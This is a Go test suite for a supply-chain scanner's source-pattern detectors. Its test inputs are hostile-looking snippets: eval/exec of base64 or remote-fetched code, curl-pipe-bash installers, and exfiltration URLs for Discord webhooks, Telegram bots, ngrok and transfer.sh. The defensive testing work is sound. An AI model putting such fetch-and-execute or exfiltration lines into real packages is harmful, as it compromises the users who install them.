package heuristics

import (
	"slices"
	"strings"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestDetectSourcePatterns_Obfuscation(t *testing.T) {
	tests := []struct {
		name    string
		js      string
		wantHas domain.Capability
	}{
		{
			name:    "eval(atob(...))",
			js:      `eval(atob("Y29uc29sZS5sb2coJ3BheWxvYWQnKQ=="))`,
			wantHas: domain.CapObfuscatedPayload,
		},
		{
			name:    "Function(decodeURIComponent(...))",
			js:      `(new Function(decodeURIComponent("..." )))()`,
			wantHas: domain.CapObfuscatedPayload,
		},
		{
			name:    "Function(unescape(...))",
			js:      `Function(unescape("%20"))()`,
			wantHas: domain.CapObfuscatedPayload,
		},
		{
			name:    "eval(Buffer.from(..., 'base64'))",
			js:      `eval(Buffer.from("Y29uc29sZS5sb2coKTs=", 'base64').toString())`,
			wantHas: domain.CapObfuscatedPayload,
		},
		{
			name:    "require(atob(...)) for dynamic require",
			js:      `require(atob("Y2hpbGRfcHJvY2Vzcw=="))`,
			wantHas: domain.CapObfuscatedPayload,
		},
		{
			name:    "plain eval — no decode → not flagged here (AST scanner picks it up)",
			js:      `eval("console.log('hi')")`,
			wantHas: 0,
		},
		{
			name:    "atob alone — not flagged (decoding is benign)",
			js:      `const data = atob(input)`,
			wantHas: 0,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{"index.js": []byte(tc.js)},
			})
			has := false
			for _, c := range caps {
				if c == domain.CapObfuscatedPayload {
					has = true
				}
			}
			if (tc.wantHas == domain.CapObfuscatedPayload) != has {
				t.Errorf("CapObfuscatedPayload presence mismatch: got %v, want %v (caps=%v)", has, tc.wantHas != 0, caps)
			}
		})
	}
}

func TestDetectSourcePatterns_SuspiciousURL(t *testing.T) {
	tests := []struct {
		name    string
		js      string
		wantHas bool
	}{
		{
			name:    "Pastebin URL",
			js:      `fetch("https://pastebin.com/raw/abc123")`,
			wantHas: true,
		},
		{
			name:    "Discord webhook",
			js:      `fetch("https://discord.com/api/webhooks/111/abc")`,
			wantHas: true,
		},
		{
			name:    "Telegram bot URL",
			js:      `fetch("https://api.telegram.org/bot12345:abc/sendMessage")`,
			wantHas: true,
		},
		{
			name:    "ngrok tunnel",
			js:      `const u = "http://abc.ngrok.io/exfil"`,
			wantHas: true,
		},
		{
			name:    "transfer.sh exfil",
			js:      `fetch("https://transfer.sh/x/data")`,
			wantHas: true,
		},
		{
			name:    "IDN homoglyph (Punycode)",
			js:      `fetch("https://xn--80ak6aa92e.com/x")`, // looks like apple.com
			wantHas: true,
		},
		{
			name:    "ipinfo (exfiltrates victim IP)",
			js:      `axios.get("https://ipinfo.io/json")`,
			wantHas: true,
		},
		{
			name:    "legitimate URL — no flag",
			js:      `fetch("https://api.github.com/repos/foo/bar")`,
			wantHas: false,
		},
		{
			name:    "no URL — no flag",
			js:      `console.log("hello")`,
			wantHas: false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{"index.js": []byte(tc.js)},
			})
			has := false
			for _, c := range caps {
				if c == domain.CapSuspiciousURL {
					has = true
				}
			}
			if has != tc.wantHas {
				t.Errorf("CapSuspiciousURL presence: got %v, want %v", has, tc.wantHas)
			}
		})
	}
}

// TestDetectSourcePatterns_OnlyJSFiles ensures we don't false-positive
// on README / changelog content that contains the word "eval" or
// example URLs.
func TestDetectSourcePatterns_OnlyJSFiles(t *testing.T) {
	caps := checkSourcePatterns(NormalizedPackage{
		Files: map[string][]byte{
			"README.md":    []byte("Don't use eval(atob(x)). And don't fetch https://pastebin.com."),
			"package.json": []byte("{}"),
		},
	})
	if len(caps) != 0 {
		t.Errorf("README content should NOT trigger source-pattern detectors, got %v", caps)
	}
}

// URL scan runs over .py / .rb (and other analyzable sources), not
// only JS — Plan A in detection-gaps-roadmap. The obfuscation regex
// stays JS-shaped, so .py and .rb files won't accidentally fire it.
func TestDetectSourcePatterns_URLScanIsLanguageAgnostic(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		body     string
		wantHas  domain.Capability
	}{
		{
			name:     "python with pastebin URL",
			filename: "setup.py",
			body:     `payload = "https://pastebin.com/raw/AAAAA"`,
			wantHas:  domain.CapSuspiciousURL,
		},
		{
			name:     "ruby with discord webhook",
			filename: "lib/foo.rb",
			body:     `WEBHOOK = "https://discord.com/api/webhooks/123/abc"`,
			wantHas:  domain.CapSuspiciousURL,
		},
		{
			name:     "rust with telegram bot URL",
			filename: "build.rs",
			body:     `let url = "https://api.telegram.org/bot999/sendMessage";`,
			wantHas:  domain.CapSuspiciousURL,
		},
		{
			name:     "python without suspicious URL",
			filename: "setup.py",
			body:     `requires = ["requests >= 2.0"]`,
			wantHas:  0,
		},
		{
			name:     "python eval(atob(...)) does NOT fire JS-shaped obfuscation",
			filename: "evil.py",
			body:     `eval(atob("Y29uc29sZS5sb2c="))`,
			wantHas:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{tt.filename: []byte(tt.body)},
			})
			has := false
			for _, c := range caps {
				if c == tt.wantHas {
					has = true
				}
			}
			if tt.wantHas != 0 && !has {
				t.Errorf("want %v, got %v", tt.wantHas, caps)
			}
			if tt.wantHas == 0 && len(caps) != 0 {
				t.Errorf("want no caps, got %v", caps)
			}
		})
	}
}

// Plan B — Ruby `eval(Net::HTTP.get(...))` and friends. Mirrors the
// JS obfuscation suite in shape; only positive cases are exhaustive
// (negatives covered above and in TestDetectSourcePatterns_OnlyJSFiles).
func TestDetectSourcePatterns_RubyObfuscation(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		body     string
		wantHas  domain.Capability
	}{
		{
			name:     "eval(Net::HTTP.get(URI(...)))",
			filename: "lib/restclient.rb",
			body:     `eval(Net::HTTP.get(URI('http://x.test/payload')))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "eval(Net::HTTP.post(...))",
			filename: "lib/foo.rb",
			body:     `eval(Net::HTTP.post(URI('http://x.test'), body))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "eval(open('http://...'))",
			filename: "lib/foo.rb",
			body:     `eval(open('http://example.test/payload'))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "eval(URI.open(...))",
			filename: "lib/foo.rb",
			body:     `eval(URI.open(remote))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "Net::HTTP.get without eval — not flagged",
			filename: "lib/foo.rb",
			body:     `body = Net::HTTP.get(URI('http://api.example.test/v1'))`,
			wantHas:  0,
		},
		{
			name:     "eval on local string — not flagged",
			filename: "lib/foo.rb",
			body:     `eval("puts 'hi'")`,
			wantHas:  0,
		},
		{
			name:     ".gemspec extension also scanned",
			filename: "foo.gemspec",
			body:     `eval(Net::HTTP.get(URI('http://x.test')))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{tt.filename: []byte(tt.body)},
			})
			has := false
			for _, c := range caps {
				if c == tt.wantHas {
					has = true
				}
			}
			if tt.wantHas != 0 && !has {
				t.Errorf("want %v, got %v", tt.wantHas, caps)
			}
			if tt.wantHas == 0 && len(caps) != 0 {
				t.Errorf("want no caps, got %v", caps)
			}
		})
	}
}

// Plan C — Python `exec(urlopen(...))` / `exec(base64.b64decode(...))`.
// Mirrors the Ruby suite in shape.
func TestDetectSourcePatterns_PythonObfuscation(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		body     string
		wantHas  domain.Capability
	}{
		{
			name:     "exec(urllib.request.urlopen(...).read())",
			filename: "setup.py",
			body:     `exec(urllib.request.urlopen('http://x.test/p').read())`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "exec(requests.get(...).text)",
			filename: "pkg/__init__.py",
			body:     `exec(requests.get('http://x.test').text)`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "exec(base64.b64decode(...))",
			filename: "pkg/loader.py",
			body:     `exec(base64.b64decode(b"cHJpbnQoJ2hpJyk="))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "exec(compile(base64.b64decode(...), ...))",
			filename: "pkg/loader.py",
			body:     `exec(compile(base64.b64decode(b"..."), '<x>', 'exec'))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "eval(urllib.request.urlopen(...))",
			filename: "pkg/loader.py",
			body:     `eval(urllib.request.urlopen('http://x.test/p').read())`,
			wantHas:  domain.CapObfuscatedPayload,
		},
		{
			name:     "exec on local string — not flagged",
			filename: "pkg/loader.py",
			body:     `exec("print('hi')")`,
			wantHas:  0,
		},
		{
			name:     "requests.get without exec — not flagged",
			filename: "pkg/foo.py",
			body:     `data = requests.get('http://api.example.test/v1').text`,
			wantHas:  0,
		},
		{
			name:     ".pyx (Cython) extension also scanned",
			filename: "pkg/fast.pyx",
			body:     `exec(base64.b64decode(payload))`,
			wantHas:  domain.CapObfuscatedPayload,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{tt.filename: []byte(tt.body)},
			})
			has := false
			for _, c := range caps {
				if c == tt.wantHas {
					has = true
				}
			}
			if tt.wantHas != 0 && !has {
				t.Errorf("want %v, got %v", tt.wantHas, caps)
			}
			if tt.wantHas == 0 && len(caps) != 0 {
				t.Errorf("want no caps, got %v", caps)
			}
		})
	}
}

// Sanity: catches the pattern even in minified content (one long line).
func TestDetectSourcePatterns_ShellFetcher(t *testing.T) {
	cases := []struct {
		name string
		file string
		body string
		want bool
	}{
		{
			name: "curl pipe bash JS string",
			file: "index.js",
			body: `exec("curl -fsSL https://raw.githubusercontent.com/JuliusBrussee/caveman/main/install.sh | bash")`,
			want: true,
		},
		{
			name: "wget pipe sh Python",
			file: "setup.py",
			body: `os.system("wget -qO- https://example.com/setup.sh | sh")`,
			want: true,
		},
		{
			name: "curl pipe zsh Ruby",
			file: "lib/install.rb",
			body: "`curl -fsSL https://install.example.com/go.sh | zsh`",
			want: true,
		},
		{
			name: "curl flags URL pipe bash multiline",
			file: "scripts/run.js",
			body: "const cmd = `curl --silent --location https://raw.githubusercontent.com/user/repo/HEAD/install.sh | bash`;",
			want: true,
		},
		{
			name: "benign curl without pipe",
			file: "index.js",
			body: `const r = await fetch(url); // curl -v https://api.example.com/health`,
			want: false,
		},
		{
			name: "non-source file skipped",
			file: "README.md",
			body: "curl -fsSL https://raw.githubusercontent.com/user/repo/main/install.sh | bash",
			want: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			caps := checkSourcePatterns(NormalizedPackage{
				Files: map[string][]byte{tc.file: []byte(tc.body)},
			})
			got := slices.Contains(caps, domain.CapInstallHookSuspicious)
			if got != tc.want {
				t.Errorf("CapInstallHookSuspicious = %v, want %v (caps: %v)", got, tc.want, caps)
			}
		})
	}
}

func TestDetectSourcePatterns_Minified(t *testing.T) {
	js := strings.Repeat("var x=1;", 1000) + `eval(atob("YWJj"))` + strings.Repeat("var y=2;", 1000)
	caps := checkSourcePatterns(NormalizedPackage{
		Files: map[string][]byte{"bundle.min.js": []byte(js)},
	})
	found := false
	for _, c := range caps {
		if c == domain.CapObfuscatedPayload {
			found = true
		}
	}
	if !found {
		t.Error("should still detect eval(atob(...)) inside minified bundle")
	}
}
